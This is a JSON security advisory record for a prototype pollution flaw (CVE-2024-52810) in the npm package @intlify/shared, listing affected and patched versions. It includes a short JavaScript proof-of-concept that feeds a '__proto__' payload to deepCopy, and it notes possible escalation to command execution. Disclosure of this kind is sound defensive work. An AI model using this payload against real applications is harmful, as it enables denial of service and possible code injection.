{
  "Severity": "MODERATE",
  "UpdatedAt": "2024-12-02T17:26:48Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "@intlify/vue-i18n-core"
  },
  "Advisory": {
    "DatabaseId": 270279,
    "Id": "GSA_kwCzR0hTQS1oandxLW1qd2otNHg2Y84ABB_H",
    "GhsaId": "GHSA-hjwq-mjwj-4x6c",
    "References": [
      {
        "Url": "https://github.com/intlify/vue-i18n/security/advisories/GHSA-hjwq-mjwj-4x6c"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52810"
      },
      {
        "Url": "https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d"
      },
      {
        "Url": "https://github.com/advisories/GHSA-hjwq-mjwj-4x6c"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-hjwq-mjwj-4x6c"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-52810"
      }
    ],
    "Description": "**Vulnerability type: Prototype Pollution**\n\n**Affected Package:**\n\nProduct: @intlify/shared\nVersion: 10.0.4\n\n\n**Vulnerability Location(s):**\n\n`node_modules/@intlify/shared/dist/shared.cjs:232:26`\n\n\n**Description:**\n\nThe latest version of `@intlify/shared (10.0.4)` is vulnerable to Prototype Pollution through the entry function(s) `lib.deepCopy`. An attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install @intlify/shared@10.0.4\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n\n```js\n(async () =\u003e {\nconst lib = await import('@intlify/shared');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.deepCopy (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'), someObj)\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n```\n\n**References**\n\n[Prototype Pollution Leading to Remote Code Execution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) - An example of how prototype pollution can lead to command code injection.\n\n[OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html) - Best practices for preventing prototype pollution.\n\n[PortSwigger Guide on Preventing Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/preventing) - A detailed guide to securing your applications against prototype pollution.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-12-02T17:26:47Z",
    "Severity": "MODERATE",
    "Summary": "@intlify/shared Prototype Pollution vulnerability",
    "UpdatedAt": "2024-12-02T17:26:48Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "10.0.5"
      },
      "VulnerableVersionRange": "\u003e= 10.0.0, \u003c 10.0.5"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "9.14.2"
      },
      "VulnerableVersionRange": "\u003e= 9.7.0, \u003c 9.14.2"
    }
  ]
}